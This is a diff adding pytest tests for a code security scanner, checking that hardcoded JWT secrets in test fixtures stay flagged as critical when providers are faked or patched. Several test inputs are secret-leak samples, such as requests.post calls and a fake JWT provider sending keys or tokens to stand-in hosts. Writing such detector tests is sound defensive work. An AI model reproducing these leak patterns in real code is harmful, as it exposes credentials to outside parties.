@@ -13233,3 +13233,537 @@ def test_yaml_loader_argument_requires_canonical_safe_provider(
     (tmp_path / "parse_input.py").write_text(source, encoding="utf-8")
     findings = security_scan(tmp_path, cache_enabled=False)["findings"]
     assert any(item["code"] == "SECURITY_UNSAFE_YAML" for item in findings) is expected
+
+
+@pytest.mark.parametrize(
+    "fixture,type_path",
+    [
+        ("jwt", "jwt.api_jwt.PyJWT"),
+        ("jws", "jwt.api_jws.PyJWS"),
+    ],
+)
+def test_protocol_fixture_fake_provider_does_not_clear_secret_finding(
+    tmp_path, fixture, type_path
+):
+    type_name = type_path.rsplit(".", 1)[-1]
+    module_name = type_path.rsplit(".", 1)[0]
+    source = (
+        "import pytest\n"
+        f"from {module_name} import {type_name}\n"
+        f"@pytest.fixture\ndef {fixture}() -> {type_name}:\n"
+        f"    return {type_name}()\n"
+        f"class Test{type_name}:\n"
+        f"    def test_roundtrip(self, {fixture}: {type_name}):\n"
+        '        secret = "secret"\n'
+        f"        token = {fixture}.encode({{'sub': 'sample'}}, secret)\n"
+        f"        assert {fixture}.decode(token, secret) == {{'sub': 'sample'}}\n"
+    )
+    (tmp_path / "test_protocol.py").write_text(source, encoding="utf-8")
+    provider_path = tmp_path / Path(*module_name.split(".")).with_suffix(".py")
+    provider_path.parent.mkdir(parents=True, exist_ok=True)
+    provider_path.write_text(
+        "import hashlib\n"
+        f"class {type_name}:\n"
+        "    def encode(self, payload, key):\n"
+        "        return hashlib.sha256(key).hexdigest()\n"
+        "    def decode(self, token, key):\n        return token\n",
+        encoding="utf-8",
+    )
+
+    report = security_scan(tmp_path, cache_enabled=False)
+    findings = [
+        item
+        for item in report["findings"]
+        if item["code"] == "SECURITY_HARDCODED_SECRET"
+    ]
+
+    assert len(findings) == 1
+    assert findings[0]["severity"] == "CRITICAL"
+    assert report.get("primitive_observation_count", 0) == 0
+
+
+@pytest.mark.parametrize(
+    "middle",
+    [
+        "secret = 'replacement-test-key'",
+        "token = 'provider-issued-token'",
+        "payload = fetch_external_payload()",
+        "payload = {'sub': fetch_external_subject()}",
+        "payload = {'sub': 'local'}\npayload = fetch_external_payload()",
+    ],
+)
+def test_jwt_roundtrip_witness_rejects_reassignment_and_nested_external_data(middle):
+    import ast
+    from factoryline.mock_fixture_provenance import (
+        _jwt_local_literal_uses,
+        _jwt_roundtrip_witness,
+    )
+
+    module = ast.parse(
+        "def test_case(jwt):\n"
+        "    secret = 'local-test-key'\n"
+        "    payload = {'sub': 'local'}\n"
+        "    token = jwt.encode(payload, secret)\n"
+        + "\n".join(f"    {line}" for line in middle.splitlines())
+        + "\n    jwt.decode(token, secret)\n"
+    )
+    owner = module.body[0]
+    if middle.startswith("secret ="):
+        node = owner.body[0]
+        assert not _jwt_local_literal_uses(
+            node, node.targets[0], owner, "jwt", module
+        )
+        return
+    assert _jwt_roundtrip_witness(owner, "secret", "jwt", module, {}) is None
+
+
+def test_jwt_roundtrip_witness_allows_repeated_same_key_token_reads_only():
+    import ast
+
+    from factoryline.mock_fixture_provenance import _jwt_roundtrip_witness
+
+    same_key = ast.parse(
+        "def test_case(jwt):\n"
+        "    secret = 'local-test-key'\n"
+        "    payload = {'sub': 'local'}\n"
+        "    token = jwt.encode(payload, secret)\n"
+        "    jwt.decode(token, secret)\n"
+        "    jwt.decode(token, secret, options={'verify_signature': False})\n"
+    )
+    assert _jwt_roundtrip_witness(
+        same_key.body[0], "secret", "jwt", same_key, {}
+    ) is not None
+
+    mismatched_key = ast.parse(
+        "def test_case(jwt):\n"
+        "    secret = 'local-test-key'\n"
+        "    bad_secret = 'different-test-key'\n"
+        "    payload = {'sub': 'local'}\n"
+        "    token = jwt.encode(payload, secret)\n"
+        "    jwt.decode(token, secret)\n"
+        "    jwt.decode(token, bad_secret)\n"
+    )
+    assert _jwt_roundtrip_witness(
+        mismatched_key.body[0], "secret", "jwt", mismatched_key, {}
+    ) is None
+
+
+@pytest.mark.parametrize(
+    ("payload_operation", "expected_witness"),
+    [
+        ("payload['sub'] = fetch_external_subject()", False),
+        ("populate_from_provider(payload)", False),
+        ("alias = payload", False),
+        ("payload['aud'] = 'urn:local-test'", True),
+    ],
+)
+def test_jwt_payload_root_lifetime_rejects_unknown_mutation_and_allows_literal_update(
+    payload_operation, expected_witness
+):
+    import ast
+    from factoryline.mock_fixture_provenance import _jwt_roundtrip_witness
+
+    module = ast.parse(
+        "def test_case(jwt):\n"
+        "    secret = 'local-test-key'\n"
+        "    payload = {'sub': 'local'}\n"
+        f"    {payload_operation}\n"
+        "    token = jwt.encode(payload, secret)\n"
+        "    jwt.decode(token, secret)\n"
+    )
+
+    witness = _jwt_roundtrip_witness(module.body[0], "secret", "jwt", module, {})
+
+    assert (witness is not None) is expected_witness
+
+
+def test_jwt_timestamp_fixture_generator_uses_captured_source_identity(tmp_path):
+    import ast
+    from pathlib import Path
+
+    from factoryline import review_audits
+    from factoryline.mock_fixture_provenance import (
+        _jwt_captured_test_timestamp_call,
+        _jwt_timestamp_helper_is_source_bound,
+    )
+
+    root = Path(tmp_path)
+    source = (
+        "from calendar import timegm\n"
+        "from datetime import datetime, timezone\n"
+        "def tick():\n"
+        "    return timegm(datetime.now(tz=timezone.utc).utctimetuple())\n"
+    ).encode()
+    helper_path = root / "tests" / "utils.py"
+    helper_path.parent.mkdir()
+    helper_path.write_bytes(source)
+    module = ast.parse("from .utils import tick as generated_now\n")
+    module._security_source_context = (root, {helper_path: source})
+    module._security_oracle_context = {
+        "captured_imports": {"generated_now": ("tests/utils.py", "tick")}
+    }
+    aliases = review_audits._module_security_aliases(module)
+    call = ast.parse("generated_now()").body[0].value
+
+    assert _jwt_captured_test_timestamp_call(call, module, aliases)
+
+    shadowed = ast.parse(
+        "from .utils import tick as generated_now\n"
+        "generated_now = remote_clock\n"
+    )
+    shadowed._security_source_context = (root, {helper_path: source})
+    shadowed._security_oracle_context = module._security_oracle_context
+    assert not _jwt_captured_test_timestamp_call(
+        call, shadowed, review_audits._module_security_aliases(shadowed)
+    )
+
+    helper = ast.parse(source)
+    helper_function = next(
+        item
+        for item in helper.body
+        if isinstance(item, ast.FunctionDef) and item.name == "tick"
+    )
+    assert _jwt_timestamp_helper_is_source_bound(helper_function, helper)
+
+    rebound = ast.parse(source.decode() + "timegm = external_clock\n")
+    rebound_function = next(
+        item
+        for item in rebound.body
+        if isinstance(item, ast.FunctionDef) and item.name == "tick"
+    )
+    assert not _jwt_timestamp_helper_is_source_bound(rebound_function, rebound)
+
+    mutated_attribute = ast.parse(
+        source.decode() + "datetime.now = external_clock\n"
+    )
+    mutated_function = next(
+        item
+        for item in mutated_attribute.body
+        if isinstance(item, ast.FunctionDef) and item.name == "tick"
+    )
+    assert not _jwt_timestamp_helper_is_source_bound(
+        mutated_function, mutated_attribute
+    )
+
+    for mutation in (
+        "setattr(datetime, 'now', external_clock)",
+        "delattr(datetime, 'now')",
+    ):
+        mutated_dependency = ast.parse(source.decode() + mutation + "\n")
+        mutated_function = next(
+            item
+            for item in mutated_dependency.body
+            if isinstance(item, ast.FunctionDef) and item.name == "tick"
+        )
+        assert not _jwt_timestamp_helper_is_source_bound(
+            mutated_function, mutated_dependency
+        )
+
+
+def test_jwt_provider_profile_rejects_dead_api_calls_and_provider_rebinding():
+    import ast
+    from factoryline.mock_fixture_provenance import (
+        _jwt_provider_api_profile_safe,
+        _jwt_provider_aliases,
+        _jwt_provider_write,
+    )
+
+    fake = ast.parse(
+        "class PyJWT:\n"
+        "    def encode(self, payload, key):\n"
+        "        if False: return self._jws.encode(payload, key)\n"
+        "        return key\n"
+        "    def decode(self, token, key):\n"
+        "        if False: self.decode_complete(token, key)\n"
+        "        return {'payload': {'sub': 'account'}}\n"
+        "    def decode_complete(self, token, key):\n"
+        "        if False: self._jws.decode_complete(token, key)\n"
+        "        return {'payload': {'sub': 'account'}}\n"
+    )
+    assert not _jwt_provider_api_profile_safe(fake.body[0], "PyJWT")
+
+    provider = ast.parse("from jwt.api_jwt import PyJWT\nPyJWT.encode = replacement\n")
+    aliases = {"PyJWT": "jwt.api_jwt.PyJWT"}
+    provider_aliases = _jwt_provider_aliases(provider, "PyJWT", aliases)
+    assert any(
+        _jwt_provider_write(item, "PyJWT", aliases, provider_aliases)
+        for item in ast.walk(provider)
+    )
+
+
+def test_jwt_role_proof_stays_active_when_source_inventory_is_incomplete(
+    monkeypatch,
+):
+    from factoryline import primitive_observation_binding as binding
+    from factoryline import review_audits as scanner
+
+    finding = {
+        "code": "SECURITY_HARDCODED_SECRET",
+        "severity": "CRITICAL",
+        "path": "tests/test_api_jwt.py",
+        "line": 2,
+        "column": 4,
+        "message": "JWT role evidence requires complete source inventory.",
+        "facts": {"disposition": "PROVEN_LOCAL_CRYPTO_TEST_PRIMITIVE"},
+    }
+    core = {
+        "findings": [finding],
+        "primitive_observations": [],
+        "sources": [],
+        "audit_coverage": {"complete": False},
+        "database_context": None,
+    }
+    monkeypatch.setattr(
+        scanner, "_fixed_primitive_binding", lambda *args: True, raising=False
+    )
+    binding.partition_proven_primitive_observations(core, scanner)
+
+    assert core["primitive_observations"] == []
+    assert len(core["findings"]) == 1
+    assert core["findings"][0]["severity"] == "CRITICAL"
+    assert core["findings"][0]["facts"]["state"] == "INCOMPLETE"
+
+
+@pytest.mark.parametrize(
+    "extra",
+    [
+        'requests.post("https://example.test", json={"password": secret})\n',
+        "return secret\n",
+        "consume(secret)\n",
+        "def nested():\n            return secret\n",
+        "jwt = external_provider()\n",
+    ],
+)
+def test_protocol_fixture_secret_escapes_remain_findings(tmp_path, extra):
+    source = (
+        "import pytest\n"
+        "from jwt.api_jwt import PyJWT\n"
+        "@pytest.fixture\ndef jwt() -> PyJWT:\n"
+        "    return PyJWT()\n"
+        "class TestJWT:\n"
+        "    def test_roundtrip(self, jwt: PyJWT):\n"
+        '        secret = "secret"\n'
+        "        token = jwt.encode({'sub': 'sample'}, secret)\n"
+        "        assert jwt.decode(token, secret) == {'sub': 'sample'}\n"
+        + textwrap.indent(extra, "        ")
+    )
+    (tmp_path / "test_protocol.py").write_text(source, encoding="utf-8")
+
+    findings = [
+        item
+        for item in security_scan(tmp_path, cache_enabled=False)["findings"]
+        if item["code"] == "SECURITY_HARDCODED_SECRET"
+    ]
+
+    assert [(item["path"], item["line"]) for item in findings] == [
+        ("test_protocol.py", 8)
+    ]
+
+
+@pytest.mark.parametrize("provider", ["Other()", "make_jwt()"])
+def test_protocol_fixture_requires_exact_local_provider(tmp_path, provider):
+    (tmp_path / "test_protocol.py").write_text(
+        "import pytest\n"
+        "from jwt.api_jwt import PyJWT\n"
+        "@pytest.fixture\ndef jwt() -> PyJWT:\n"
+        f"    return {provider}\n"
+        "class TestJWT:\n"
+        "    def test_roundtrip(self, jwt: PyJWT):\n"
+        '        secret = "secret"\n'
+        "        token = jwt.encode({'sub': 'sample'}, secret)\n"
+        "        assert jwt.decode(token, secret) == {'sub': 'sample'}\n",
+        encoding="utf-8",
+    )
+
+    findings = [
+        item
+        for item in security_scan(tmp_path, cache_enabled=False)["findings"]
+        if item["code"] == "SECURITY_HARDCODED_SECRET"
+    ]
+
+    assert [(item["path"], item["line"]) for item in findings] == [
+        ("test_protocol.py", 8)
+    ]
+
+
+@pytest.mark.parametrize(
+    "extra_import,mutation",
+    [
+        ("", "PyJWT.encode = external_encode"),
+        ("import jwt.api_jwt\n", "jwt.api_jwt.PyJWT.decode = external_decode"),
+        ("", 'setattr(PyJWT, "encode", external_encode)'),
+        (
+            "from unittest.mock import patch\n",
+            'patch("jwt.api_jwt.PyJWT.encode", external_encode)',
+        ),
+    ],
+)
+def test_protocol_fixture_rejects_provider_method_mutation(
+    tmp_path, extra_import, mutation
+):
+    (tmp_path / "test_protocol.py").write_text(
+        "import pytest\n" + extra_import + "from jwt.api_jwt import PyJWT\n"
+        "@pytest.fixture\ndef jwt() -> PyJWT:\n"
+        "    return PyJWT()\n"
+        f"{mutation}\n"
+        "class TestJWT:\n"
+        "    def test_roundtrip(self, jwt: PyJWT):\n"
+        '        secret = "secret"\n'
+        "        token = jwt.encode({'sub': 'sample'}, secret)\n"
+        "        assert jwt.decode(token, secret) == {'sub': 'sample'}\n",
+        encoding="utf-8",
+    )
+
+    findings = [
+        item
+        for item in security_scan(tmp_path, cache_enabled=False)["findings"]
+        if item["code"] == "SECURITY_HARDCODED_SECRET"
+    ]
+
+    assert len(findings) == 1
+    assert findings[0]["path"] == "test_protocol.py"
+    assert findings[0]["severity"] == "CRITICAL"
+
+
+@pytest.mark.parametrize(
+    "case",
+    [
+        "receiver_method_write",
+        "receiver_opaque_escape",
+        "encoded_token_http_auth_escape",
+        "local_fake_jwt_provider",
+        "provider_secondary_alias_write",
+        "nearer_class_fixture_override",
+        "auth_token_return_indirect",
+        "global_token_export",
+    ],
+)
+def test_jwt_fixture_family_adversarial_roles_remain_critical(tmp_path, case):
+    before, after, class_override = "", "", ""
+    provider = (
+        "import hashlib\n"
+        "class PyJWT:\n"
+        "    def encode(self, payload, key):\n"
+        "        return hashlib.sha256(key).hexdigest()\n"
+        "    def decode(self, token, key):\n        return token\n"
+    )
+    module_extra = ""
+    if case == "receiver_method_write":
+        before = "jwt.encode = leak"
+    elif case == "receiver_opaque_escape":
+        before = "mutate(jwt)"
+    elif case == "encoded_token_http_auth_escape":
+        after = (
+            'requests.post("https://service.invalid", headers={"Authorization": token})'
+        )
+    elif case == "local_fake_jwt_provider":
+        provider = (
+            "import requests\n"
+            "class PyJWT:\n"
+            "    def encode(self, payload, key):\n"
+            '        requests.post("https://service.invalid", auth=("account", key))\n'
+            "        return key\n"
+            "    def decode(self, token, key):\n        return token\n"
+        )
+    elif case == "provider_secondary_alias_write":
+        module_extra = "Alias = PyJWT\nAlias.encode = leak\n"
+    elif case == "nearer_class_fixture_override":
+        class_override = (
+            "    @pytest.fixture\n"
+            "    def jwt(self) -> PyJWT:\n        return External()\n"
+        )
+    elif case == "auth_token_return_indirect":
+        after = "result = token\nreturn result"
+    elif case == "global_token_export":
+        after = "global published\npublished = token"
+    source = (
+        "import pytest\nimport requests\nfrom jwt.api_jwt import PyJWT\n"
+        "@pytest.fixture\ndef jwt() -> PyJWT:\n    return PyJWT()\n"
+        + module_extra
+        + "class TestJWT:\n"
+        + class_override
+        + "    def test_roundtrip(self, jwt: PyJWT):\n"
+        + textwrap.indent(before + "\n" if before else "", "        ")
+        + '        secret = "fixed-local-test-key"\n'
+        + "        token = jwt.encode({'sub':'account'}, secret)\n"
+        + "        assert jwt.decode(token, secret) == {'sub':'account'}\n"
+        + textwrap.indent(after + "\n" if after else "", "        ")
+    )
+    (tmp_path / "test_protocol.py").write_text(source, encoding="utf-8")
+    provider_path = tmp_path / "jwt" / "api_jwt.py"
+    provider_path.parent.mkdir(parents=True)
+    provider_path.write_text(provider, encoding="utf-8")
+
+    findings = [
+        item
+        for item in security_scan(tmp_path, cache_enabled=False)["findings"]
+        if item["code"] == "SECURITY_HARDCODED_SECRET"
+    ]
+
+    assert len(findings) == 1
+    assert findings[0]["severity"] == "CRITICAL"
+
+
+def test_global_test_literal_remains_a_finding(tmp_path):
+    (tmp_path / "test_protocol.py").write_text(
+        "import pytest\n"
+        "from jwt.api_jwt import PyJWT\n"
+        "@pytest.fixture\ndef jwt() -> PyJWT:\n"
+        "    return PyJWT()\n"
+        "class TestJWT:\n"
+        "    def test_roundtrip(self, jwt: PyJWT):\n"
+        "        global secret\n"
+        '        secret = "secret"\n'
+        "        token = jwt.encode({'sub': 'sample'}, secret)\n"
+        "        assert jwt.decode(token, secret) == {'sub': 'sample'}\n",
+        encoding="utf-8",
+    )
+
+    findings = [
+        item
+        for item in security_scan(tmp_path, cache_enabled=False)["findings"]
+        if item["code"] == "SECURITY_HARDCODED_SECRET"
+    ]
+
+    assert [(item["path"], item["line"]) for item in findings] == [
+        ("test_protocol.py", 9)
+    ]
+
+
+def test_oauth_method_catalog_literals_stay_active_without_consumer_proof(tmp_path):
+    (tmp_path / "models.py").write_text(
+        "class Application:\n"
+        '    TOKEN_AUTH_METHOD_CLIENT_SECRET_BASIC = "client_secret_basic"\n'
+        '    TOKEN_AUTH_METHOD_CLIENT_SECRET_POST = "client_secret_post"\n'
+        "    TOKEN_AUTH_METHODS = (\n"
+        '        (TOKEN_AUTH_METHOD_CLIENT_SECRET_BASIC, "Basic"),\n'
+        '        (TOKEN_AUTH_METHOD_CLIENT_SECRET_POST, "Post"),\n'
+        "    )\n",
+        encoding="utf-8",
+    )
+
+    findings = [
+        item
+        for item in security_scan(tmp_path, cache_enabled=False)["findings"]
+        if item["code"] == "SECURITY_HARDCODED_SECRET"
+    ]
+
+    assert [(item["path"], item["line"]) for item in findings] == [
+        ("models.py", 2),
+        ("models.py", 3),
+    ]
+
+
+def test_jwt_fixture_proof_helper_code_change_invalidates_native_key(
+    tmp_path, monkeypatch
+):
+    from factoryline import mock_fixture_provenance, review_audits as scanner
+
+    helper = mock_fixture_provenance.closed_jwt_test_literal
+    first = scanner._oracle_context_cache_key(tmp_path, [], {})
+
+    def replacement(relative, node, target):
+        return None
+
+    monkeypatch.setattr(helper, "__code__", replacement.__code__)
+    assert scanner._oracle_context_cache_key(tmp_path, [], {}) != first
